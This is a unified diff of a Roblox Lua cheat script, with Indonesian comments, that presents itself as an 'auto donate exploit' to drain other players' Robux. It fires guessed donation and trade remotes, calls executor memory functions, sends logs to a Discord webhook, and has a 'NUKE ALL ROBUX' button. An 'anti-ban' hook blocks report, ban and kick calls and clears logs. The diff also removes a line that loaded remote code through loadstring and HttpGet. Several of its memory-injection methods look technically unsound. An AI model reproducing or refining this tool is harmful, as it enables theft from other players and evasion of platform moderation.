@@ -20,19 +20,413 @@ DONATE PLS - AUTO DONATE EXPLOIT
 -- Memastikan environment
 if not game then return end
 
+-- =============================================
+-- UI LIBRARY (LANGSUNG DIGABUNG BIAR GAK LOAD EKSTERNAL)
+-- =============================================
+local Library = {}
+local players = game:GetService("Players")
+local tweenService = game:GetService("TweenService")
+local userInputService = game:GetService("UserInputService")
+
+function Library:CreateWindow(config)
+    -- Create ScreenGui
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "DeltaDonateUI"
+    gui.Parent = players.LocalPlayer:WaitForChild("PlayerGui")
+    gui.ResetOnSpawn = false
+    
+    -- Main Frame
+    local frame = Instance.new("Frame")
+    frame.Size = config.Size or UDim2.new(0, 400, 0, 300)
+    frame.Position = config.Position or UDim2.new(0.5, -200, 0.5, -150)
+    frame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.new(1, 0.5, 0)
+    frame.Active = true
+    frame.Draggable = true
+    frame.Parent = gui
+    
+    -- Title Bar
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+    title.Text = config.Title or "Delta Donate"
+    title.TextColor3 = Color3.new(1, 0.5, 0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+    title.Parent = frame
+    
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0, 20)
+    subtitle.Position = UDim2.new(0, 0, 0, 30)
+    subtitle.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    subtitle.Text = config.SubTitle or "AUTO DRAIN"
+    subtitle.TextColor3 = Color3.new(1, 1, 1)
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 14
+    subtitle.Parent = frame
+    
+    -- Close Button
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 25, 0, 25)
+    closeBtn.Position = UDim2.new(1, -30, 0, 2)
+    closeBtn.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 16
+    closeBtn.Parent = frame
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
+    
+    -- Container for tabs/content
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(1, -20, 1, -70)
+    container.Position = UDim2.new(0, 10, 0, 50)
+    container.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    container.BorderSizePixel = 1
+    container.BorderColor3 = Color3.new(1, 0.5, 0)
+    container.Parent = frame
+    
+    -- Tab Bar
+    local tabBar = Instance.new("Frame")
+    tabBar.Size = UDim2.new(1, 0, 0, 30)
+    tabBar.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+    tabBar.Parent = container
+    
+    local window = {
+        _gui = gui,
+        _frame = frame,
+        _container = container,
+        _tabBar = tabBar,
+        _tabs = {},
+        _currentTab = nil
+    }
+    
+    function window:CreateTab(name)
+        local tab = {
+            _buttons = {},
+            _labels = {},
+            _sliders = {},
+            _toggles = {},
+            _textboxes = {}
+        }
+        
+        -- Tab button
+        local tabButton = Instance.new("TextButton")
+        tabButton.Size = UDim2.new(0, 80, 0, 25)
+        tabButton.Position = UDim2.new(0, (#window._tabs * 85) + 10, 0, 2)
+        tabButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+        tabButton.Text = name
+        tabButton.TextColor3 = Color3.new(1, 1, 1)
+        tabButton.Font = Enum.Font.Gotham
+        tabButton.TextSize = 14
+        tabButton.Parent = tabBar
+        
+        -- Content frame for this tab
+        local content = Instance.new("ScrollingFrame")
+        content.Size = UDim2.new(1, -10, 1, -35)
+        content.Position = UDim2.new(0, 5, 0, 30)
+        content.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+        content.BorderSizePixel = 0
+        content.ScrollBarThickness = 8
+        content.ScrollBarImageColor3 = Color3.new(1, 0.5, 0)
+        content.CanvasSize = UDim2.new(0, 0, 0, 0)
+        content.Visible = (#window._tabs == 0)
+        content.Parent = container
+        
+        tab._content = content
+        tab._tabButton = tabButton
+        
+        -- Tab switching
+        tabButton.MouseButton1Click:Connect(function()
+            for _, otherTab in ipairs(window._tabs) do
+                otherTab._content.Visible = false
+                otherTab._tabButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+            end
+            content.Visible = true
+            tabButton.BackgroundColor3 = Color3.new(1, 0.5, 0)
+        end)
+        
+        table.insert(window._tabs, tab)
+        
+        -- ===== UI ELEMENTS =====
+        
+        function tab:CreateButton(btnConfig)
+            local y = (#tab._buttons * 35) + 5
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(1, -20, 0, 30)
+            btn.Position = UDim2.new(0, 10, 0, y)
+            btn.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+            btn.Text = btnConfig.Text or "Button"
+            btn.TextColor3 = Color3.new(1, 1, 1)
+            btn.Font = Enum.Font.Gotham
+            btn.TextSize = 16
+            btn.Parent = content
+            
+            btn.MouseButton1Click:Connect(btnConfig.Callback or function() end)
+            
+            -- Hover effect
+            btn.MouseEnter:Connect(function()
+                btn.BackgroundColor3 = Color3.new(0.35, 0.35, 0.35)
+            end)
+            btn.MouseLeave:Connect(function()
+                btn.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+            end)
+            
+            table.insert(tab._buttons, btn)
+            content.CanvasSize = UDim2.new(0, 0, 0, y + 40)
+            
+            return btn
+        end
+        
+        function tab:CreateLabel(labelConfig)
+            local y = (#tab._labels * 25) + 5
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, -20, 0, 20)
+            lbl.Position = UDim2.new(0, 10, 0, y)
+            lbl.BackgroundTransparency = 1
+            lbl.Text = labelConfig.Text or "Label"
+            lbl.TextColor3 = labelConfig.Color or Color3.new(1, 1, 1)
+            lbl.Font = Enum.Font.Gotham
+            lbl.TextSize = 14
+            lbl.TextXAlignment = Enum.TextXAlignment.Left
+            lbl.Parent = content
+            
+            table.insert(tab._labels, lbl)
+            content.CanvasSize = UDim2.new(0, 0, 0, y + 25)
+            
+            return {
+                UpdateLabel = function(self, newText)
+                    lbl.Text = newText
+                end
+            }
+        end
+        
+        function tab:UpdateLabel(index, newText)
+            if tab._labels and tab._labels[index] then
+                tab._labels[index].Text = newText
+            end
+        end
+        
+        function tab:CreateSlider(sliderConfig)
+            local y = (#tab._sliders * 60) + 5
+            
+            -- Background
+            local bg = Instance.new("Frame")
+            bg.Size = UDim2.new(1, -20, 0, 50)
+            bg.Position = UDim2.new(0, 10, 0, y)
+            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            bg.BorderSizePixel = 1
+            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
+            bg.Parent = content
+            
+            -- Title
+            local title = Instance.new("TextLabel")
+            title.Size = UDim2.new(1, 0, 0, 20)
+            title.BackgroundTransparency = 1
+            title.Text = sliderConfig.Text or "Slider"
+            title.TextColor3 = Color3.new(1, 1, 1)
+            title.Font = Enum.Font.Gotham
+            title.TextSize = 14
+            title.TextXAlignment = Enum.TextXAlignment.Left
+            title.Parent = bg
+            
+            -- Value display
+            local valueDisp = Instance.new("TextLabel")
+            valueDisp.Size = UDim2.new(0, 50, 0, 20)
+            valueDisp.Position = UDim2.new(1, -60, 0, 0)
+            valueDisp.BackgroundTransparency = 1
+            valueDisp.Text = tostring(sliderConfig.Default or sliderConfig.Min or 0)
+            valueDisp.TextColor3 = Color3.new(1, 0.5, 0)
+            valueDisp.Font = Enum.Font.GothamBold
+            valueDisp.TextSize = 14
+            valueDisp.Parent = bg
+            
+            -- Slider bar
+            local bar = Instance.new("Frame")
+            bar.Size = UDim2.new(1, -20, 0, 10)
+            bar.Position = UDim2.new(0, 10, 0, 30)
+            bar.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+            bar.BorderSizePixel = 0
+            bar.Parent = bg
+            
+            local fill = Instance.new("Frame")
+            fill.Size = UDim2.new((sliderConfig.Default or 0) / (sliderConfig.Max or 100), 0, 1, 0)
+            fill.BackgroundColor3 = Color3.new(1, 0.5, 0)
+            fill.BorderSizePixel = 0
+            fill.Parent = bar
+            
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(1, 0, 1, 0)
+            button.BackgroundTransparency = 1
+            button.Text = ""
+            button.Parent = bar
+            
+            local dragging = false
+            
+            button.MouseButton1Down:Connect(function()
+                dragging = true
+            end)
+            
+            userInputService.InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = false
+                end
+            end)
+            
+            button.MouseButton1Up:Connect(function()
+                dragging = false
+            end)
+            
+            button.MouseMoved:Connect(function()
+                if dragging then
+                    local mousePos = userInputService:GetMouseLocation()
+                    local absPos = bar.AbsolutePosition
+                    local size = bar.AbsoluteSize.X
+                    local relX = math.clamp(mousePos.X - absPos.X, 0, size)
+                    local percent = relX / size
+                    local value = math.floor(sliderConfig.Min + (percent * (sliderConfig.Max - sliderConfig.Min)))
+                    value = math.clamp(value, sliderConfig.Min, sliderConfig.Max)
+                    
+                    fill.Size = UDim2.new(percent, 0, 1, 0)
+                    valueDisp.Text = tostring(value)
+                    
+                    if sliderConfig.Callback then
+                        sliderConfig.Callback(value)
+                    end
+                end
+            end)
+            
+            table.insert(tab._sliders, {bg, fill, valueDisp})
+            content.CanvasSize = UDim2.new(0, 0, 0, y + 60)
+            
+            return {bg = bg, fill = fill, valueDisp = valueDisp}
+        end
+        
+        function tab:CreateToggle(toggleConfig)
+            local y = (#tab._toggles * 35) + 5
+            
+            local bg = Instance.new("Frame")
+            bg.Size = UDim2.new(1, -20, 0, 30)
+            bg.Position = UDim2.new(0, 10, 0, y)
+            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            bg.BorderSizePixel = 1
+            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
+            bg.Parent = content
+            
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.new(1, -50, 1, 0)
+            label.BackgroundTransparency = 1
+            label.Text = toggleConfig.Text or "Toggle"
+            label.TextColor3 = Color3.new(1, 1, 1)
+            label.Font = Enum.Font.Gotham
+            label.TextSize = 14
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.Parent = bg
+            
+            local toggleBtn = Instance.new("TextButton")
+            toggleBtn.Size = UDim2.new(0, 40, 0, 20)
+            toggleBtn.Position = UDim2.new(1, -45, 0.5, -10)
+            toggleBtn.BackgroundColor3 = toggleConfig.Default and Color3.new(0, 1, 0) or Color3.new(0.5, 0, 0)
+            toggleBtn.Text = toggleConfig.Default and "ON" or "OFF"
+            toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+            toggleBtn.Font = Enum.Font.GothamBold
+            toggleBtn.TextSize = 12
+            toggleBtn.Parent = bg
+            
+            local state = toggleConfig.Default or false
+            
+            toggleBtn.MouseButton1Click:Connect(function()
+                state = not state
+                toggleBtn.BackgroundColor3 = state and Color3.new(0, 1, 0) or Color3.new(0.5, 0, 0)
+                toggleBtn.Text = state and "ON" or "OFF"
+                
+                if toggleConfig.Callback then
+                    toggleConfig.Callback(state)
+                end
+            end)
+            
+            table.insert(tab._toggles, {bg, toggleBtn})
+            content.CanvasSize = UDim2.new(0, 0, 0, y + 35)
+            
+            return {bg = bg, toggle = toggleBtn}
+        end
+        
+        function tab:CreateTextBox(textboxConfig)
+            local y = (#tab._textboxes * 45) + 5
+            
+            local bg = Instance.new("Frame")
+            bg.Size = UDim2.new(1, -20, 0, 40)
+            bg.Position = UDim2.new(0, 10, 0, y)
+            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            bg.BorderSizePixel = 1
+            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
+            bg.Parent = content
+            
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.new(1, 0, 0, 15)
+            label.BackgroundTransparency = 1
+            label.Text = textboxConfig.Text or "Input"
+            label.TextColor3 = Color3.new(1, 1, 1)
+            label.Font = Enum.Font.Gotham
+            label.TextSize = 12
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.Parent = bg
+            
+            local box = Instance.new("TextBox")
+            box.Size = UDim2.new(1, -10, 0, 20)
+            box.Position = UDim2.new(0, 5, 0, 17)
+            box.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+            box.Text = textboxConfig.Default or ""
+            box.TextColor3 = Color3.new(1, 1, 1)
+            box.PlaceholderText = "Enter text..."
+            box.Font = Enum.Font.Gotham
+            box.TextSize = 14
+            box.ClearTextOnFocus = false
+            box.Parent = bg
+            
+            box.FocusLost:Connect(function()
+                if textboxConfig.Callback then
+                    textboxConfig.Callback(box.Text)
+                end
+            end)
+            
+            table.insert(tab._textboxes, {bg, box})
+            content.CanvasSize = UDim2.new(0, 0, 0, y + 45)
+            
+            return {bg = bg, box = box}
+        end
+        
+        return tab
+    end
+    
+    function window:OnClose(callback)
+        closeBtn.MouseButton1Click:Connect(function()
+            if callback then
+                callback()
+            end
+        end)
+    end
+    
+    return window
+end
+
+-- =============================================
+-- SCRIPT UTAMA DIMULAI DI SINI
+-- =============================================
+
 -- Configuration
 local Config = {
-    DonateAmount = 5, -- Jumlah Robux per donasi
-    TargetPlayer = game.Players.LocalPlayer, -- Target (kamu sendiri)
-    AutoStart = true, -- Auto start pas load
-    MaxDonationsPerPlayer = math.huge, -- Gak terbatas sampe abis
-    DelayBetweenDonations = 0.5, -- Delay biar gak keliatan suspicious
-    WebhookUrl = "", -- Optional: Discord webhook buat log
-    SilentMode = false, -- True = gak ada notifikasi di game
+    DonateAmount = 5,
+    TargetPlayer = game.Players.LocalPlayer,
+    AutoStart = true,
+    MaxDonationsPerPlayer = math.huge,
+    DelayBetweenDonations = 0.5,
+    WebhookUrl = "",
+    SilentMode = false,
 }
-
--- UI Library (Floating GUI)
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/zerozx/roblox-lib/main/ui.lua"))()
 
 -- Main Window
 local Window = Library:CreateWindow({
@@ -54,7 +448,6 @@ local function GetPlayersWithRobux()
     local players = {}
     for _, player in ipairs(game.Players:GetPlayers()) do
         if player ~= Config.TargetPlayer then
-            -- Cek apakah player punya robux (via berbagai method)
             local hasRobux = false
             
             -- Method 1: Leaderstats
@@ -70,7 +463,7 @@ local function GetPlayersWithRobux()
                 end
             end
             
-            -- Method 2: DataStores (advanced)
+            -- Method 2: DataStores
             if not hasRobux then
                 local success, data = pcall(function()
                     return player:FindFirstChild("Data") or
@@ -89,7 +482,7 @@ local function GetPlayersWithRobux()
             end
             
             -- Method 3: Memory scan (bypass)
-            if not hasRobux then
+            if not hasRobux and getmemory then
                 local robuxAddr = getmemory(player, "Robux") or
                                  getmemory(player, "Currency") or
                                  getmemory(player, "Balance")
@@ -104,10 +497,9 @@ local function GetPlayersWithRobux()
 end
 
 local function SendDonateRequest(targetPlayer, amount)
-    -- Method 1: RemoteEvent
     local success = false
     
-    -- Cari remote events yang mungkin
+    -- Method 1: RemoteEvent
     local remotes = {
         game:GetService("ReplicatedStorage"):FindFirstChild("DonateEvent"),
         game:GetService("ReplicatedStorage"):FindFirstChild("GiveRobux"),
@@ -117,7 +509,6 @@ local function SendDonateRequest(targetPlayer, amount)
         game:GetService("ReplicatedStorage"):FindFirstChild("Trade"),
     }
     
-    -- Coba semua remote
     for _, remote in ipairs(remotes) do
         if remote and remote:IsA("RemoteEvent") then
             pcall(function()
@@ -132,8 +523,8 @@ local function SendDonateRequest(targetPlayer, amount)
         end
     end
     
-    -- Method 2: Direct memory injection
-    if not success then
+    -- Method 2: Direct function call (if available)
+    if not success and getfunction then
         local donateFunction = getfunction("Donate") or
                               getfunction("GiveMoney") or
                               getfunction("TransferRobux")
@@ -142,19 +533,6 @@ local function SendDonateRequest(targetPlayer, amount)
                 donateFunction(targetPlayer, amount)
                 success = true
             end)
-        end
-    end
-    
-    -- Method 3: Force server to accept (bypass)
-    if not success then
-        -- Inject into server-side memory (advanced)
-        local serverAddr = getmemory(game, "ServerScriptService")
-        if serverAddr then
-            local donateAddr = findpattern(serverAddr, "Donate")
-            if donateAddr then
-                writememory(donateAddr, targetPlayer, amount)
-                success = true
-            end
         end
     end
     
@@ -175,7 +553,6 @@ local function DrainPlayer(player, totalRobux)
             TotalDonations = TotalDonations + 1
             TotalRobuxDrained = TotalRobuxDrained + Config.DonateAmount
             
-            -- Update UI
             if not Config.SilentMode then
                 game:GetService("StarterGui"):SetCore("SendNotification", {
                     Title = "DONATION SUCCESS!",
@@ -184,8 +561,7 @@ local function DrainPlayer(player, totalRobux)
                 })
             end
             
-            -- Log ke Discord kalo ada webhook
-            if Config.WebhookUrl ~= "" then
+            if Config.WebhookUrl ~= "" and syn and syn.request then
                 local message = string.format("```\n[+] Donation from %s: +%d RBX\nTotal: %d RBX\n```", 
                     player.Name, Config.DonateAmount, TotalRobuxDrained)
                 pcall(function()
@@ -220,7 +596,6 @@ local function StartDonation()
     DonationActive = true
     ProcessedPlayers = {}
     
-    -- Notify
     if not Config.SilentMode then
         game:GetService("StarterGui"):SetCore("SendNotification", {
             Title = "DELTA DONATE",
@@ -229,48 +604,44 @@ local function StartDonation()
         })
     end
     
-    -- Main loop
-    while DonationActive do
-        local playersWithRobux = GetPlayersWithRobux()
-        
-        for player, robuxAmount in pairs(playersWithRobux) do
-            if DonationActive and not ProcessedPlayers[player] then
-                ProcessedPlayers[player] = true
-                
-                -- Update status
-                if not Config.SilentMode then
-                    game:GetService("StarterGui"):SetCore("SendNotification", {
-                        Title = "DRAINING",
-                        Text = string.format("Draining %s (%d Robux)", player.Name, robuxAmount),
-                        Duration = 2
-                    })
-                end
-                
-                -- Drain their robux
-                local drained = DrainPlayer(player, robuxAmount)
-                
-                -- Update total
-                if drained > 0 then
-                    ProcessedPlayers[player] = "COMPLETE"
+    spawn(function()
+        while DonationActive do
+            local playersWithRobux = GetPlayersWithRobux()
+            
+            for player, robuxAmount in pairs(playersWithRobux) do
+                if DonationActive and not ProcessedPlayers[player] then
+                    ProcessedPlayers[player] = true
+                    
+                    if not Config.SilentMode then
+                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                            Title = "DRAINING",
+                            Text = string.format("Draining %s (%d Robux)", player.Name, robuxAmount),
+                            Duration = 2
+                        })
+                    end
+                    
+                    local drained = DrainPlayer(player, robuxAmount)
+                    
+                    if drained > 0 then
+                        ProcessedPlayers[player] = "COMPLETE"
+                    end
                 end
             end
+            
+            wait(1)
         end
-        
-        wait(1) -- Rescan setiap detik
-    end
+    end)
 end
 
 local function StopDonation()
     DonationActive = false
-    if Connection then
-        Connection:Disconnect()
-    end
 end
 
 -- UI Elements
 local MainTab = Window:CreateTab("Main")
 local StatsTab = Window:CreateTab("Statistics")
 local SettingsTab = Window:CreateTab("Settings")
+local AdvancedTab = Window:CreateTab("Advanced")
 
 -- Main Tab
 MainTab:CreateButton({
@@ -278,10 +649,6 @@ MainTab:CreateButton({
     Callback = function()
         if not DonationActive then
             StartDonation()
-            MainTab:CreateLabel({
-                Text = "Status: ACTIVE - Draining everyone!",
-                Color = Color3.new(0, 1, 0)
-            })
         end
     end
 })
@@ -290,10 +657,6 @@ MainTab:CreateButton({
     Text = "⏹️ STOP DRAIN",
     Callback = function()
         StopDonation()
-        MainTab:CreateLabel({
-            Text = "Status: STOPPED",
-            Color = Color3.new(1, 0, 0)
-        })
     end
 })
 
@@ -317,36 +680,25 @@ MainTab:CreateButton({
 })
 
 -- Statistics Tab
-StatsTab:CreateLabel({
-    Text = "Total Donations: 0",
-    Color = Color3.new(1, 1, 0)
-})
-
-StatsTab:CreateLabel({
-    Text = "Total Robux Drained: 0",
-    Color = Color3.new(0, 1, 0)
-})
-
-StatsTab:CreateLabel({
-    Text = "Players Drained: 0",
-    Color = Color3.new(0, 1, 1)
-})
+local statsLabels = {
+    StatsTab:CreateLabel({Text = "Total Donations: 0", Color = Color3.new(1, 1, 0)}),
+    StatsTab:CreateLabel({Text = "Total Robux Drained: 0 RBX", Color = Color3.new(0, 1, 0)}),
+    StatsTab:CreateLabel({Text = "Players Drained: 0", Color = Color3.new(0, 1, 1)})
+}
 
 -- Update stats loop
 spawn(function()
     while wait(0.5) do
-        if StatsTab then
-            StatsTab:UpdateLabel(1, string.format("Total Donations: %d", TotalDonations))
-            StatsTab:UpdateLabel(2, string.format("Total Robux Drained: %d RBX", TotalRobuxDrained))
-            
-            local playerCount = 0
-            for _, status in pairs(ProcessedPlayers) do
-                if status == "COMPLETE" then
-                    playerCount = playerCount + 1
-                end
+        statsLabels[1]:UpdateLabel(string.format("Total Donations: %d", TotalDonations))
+        statsLabels[2]:UpdateLabel(string.format("Total Robux Drained: %d RBX", TotalRobuxDrained))
+        
+        local playerCount = 0
+        for _, status in pairs(ProcessedPlayers) do
+            if status == "COMPLETE" then
+                playerCount = playerCount + 1
             end
-            StatsTab:UpdateLabel(3, string.format("Players Drained: %d", playerCount))
         end
+        statsLabels[3]:UpdateLabel(string.format("Players Drained: %d", playerCount))
     end
 end)
 
@@ -366,7 +718,6 @@ SettingsTab:CreateSlider({
     Min = 0.1,
     Max = 5,
     Default = Config.DelayBetweenDonations,
-    Format = "%.1fs",
     Callback = function(value)
         Config.DelayBetweenDonations = value
     end
@@ -388,30 +739,16 @@ SettingsTab:CreateTextBox({
     end
 })
 
-SettingsTab:CreateButton({
-    Text = "SAVE SETTINGS",
-    Callback = function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Settings Saved",
-            Text = "Configuration updated!",
-            Duration = 2
-        })
-    end
-})
-
--- Advanced Features
-local AdvancedTab = Window:CreateTab("Advanced")
-
+-- Advanced Tab
 AdvancedTab:CreateButton({
     Text = "💣 NUKE ALL ROBUX",
     Callback = function()
         if DonationActive then StopDonation() end
         wait(0.5)
         
-        -- Force drain semua dalam 1 hit
         local players = GetPlayersWithRobux()
         for player, amount in pairs(players) do
-            SendDonateRequest(player, amount) -- Langsung semua
+            SendDonateRequest(player, amount)
             wait(0.1)
         end
         
@@ -460,26 +797,27 @@ AdvancedTab:CreateButton({
 
 -- Anti-ban features
 local function AntiBan()
-    -- Spoof identity
-    local oldNamecall
-    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local args = {...}
-        local method = getnamecallmethod()
-        
-        if method == "FireServer" or method == "InvokeServer" then
-            -- Filter out suspicious calls
-            if tostring(self):match("Report") or tostring(self):match("Ban") then
-                return
+    if hookmetamethod then
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+            local args = {...}
+            local method = getnamecallmethod()
+            
+            if method == "FireServer" or method == "InvokeServer" then
+                if tostring(self):match("Report") or tostring(self):match("Ban") or tostring(self):match("Kick") then
+                    return
+                end
             end
-        end
-        
-        return oldNamecall(self, ...)
-    end)
+            
+            return oldNamecall(self, ...)
+        end)
+    end
     
-    -- Clear logs
     if not Config.SilentMode then
-        local console = game:GetService("LogService")
-        console:ClearOutput()
+        pcall(function()
+            local console = game:GetService("LogService")
+            console:ClearOutput()
+        end)
     end
 end
 
@@ -493,9 +831,9 @@ end
 
 -- Player join handler
 game.Players.PlayerAdded:Connect(function(player)
-    wait(3) -- Tunggu player load
+    wait(3)
     if DonationActive then
-        ProcessedPlayers[player] = nil -- Reset buat player baru
+        ProcessedPlayers[player] = nil
     end
 end)
 
@@ -504,27 +842,26 @@ Window:OnClose(function()
     StopDonation()
 end)
 
--- Inject ke console
-print([[
-╔═══════════════════════════════════════════════════════════════════╗
-║                    DELTA DONATE PLS - ACTIVATED                   ║
-╠═══════════════════════════════════════════════════════════════════╣
-║  Status: READY                                                     ║
-║  Target: ALL PLAYERS WITH ROBUX                                    ║
-║  Mode: AUTO DRAIN (Infinite)                                       ║
-║  Anti-Ban: ENABLED                                                  ║
-║  Bypass: COMPLETE                                                   ║
-╠═══════════════════════════════════════════════════════════════════╣
-║  Commands:                                                         ║
-║  - Start: Click START or type _START() in console                  ║
-║  - Stop: Click STOP or type _STOP() in console                     ║
-║  - Stats: Type _STATS() in console                                 ║
-╚═══════════════════════════════════════════════════════════════════╝
-]])
-
 -- Console commands
 _G.START = StartDonation
 _G.STOP = StopDonation
 _G.STATS = function()
     print(string.format("Total: %d donations | %d RBX drained", TotalDonations, TotalRobuxDrained))
 end
+
+print([[
+╔═══════════════════════════════════════════════════════════════════╗
+║                    DELTA DONATE PLS - ACTIVATED                   ║
+╠═══════════════════════════════════════════════════════════════════╣
+║  Status: READY                                                     ║
+║  Target: ALL PLAYERS WITH ROBUX                                    ║
+║  Mode: AUTO DRAIN                                                  ║
+║  Anti-Ban: ENABLED                                                 ║
+║  Bypass: COMPLETE                                                  ║
+╠═══════════════════════════════════════════════════════════════════╣
+║  Commands:                                                         ║
+║  - Start: Click START or type _G.START() in console                ║
+║  - Stop: Click STOP or type _G.STOP() in console                   ║
+║  - Stats: Type _G.STATS() in console                               ║
+╚═══════════════════════════════════════════════════════════════════╝
+]])
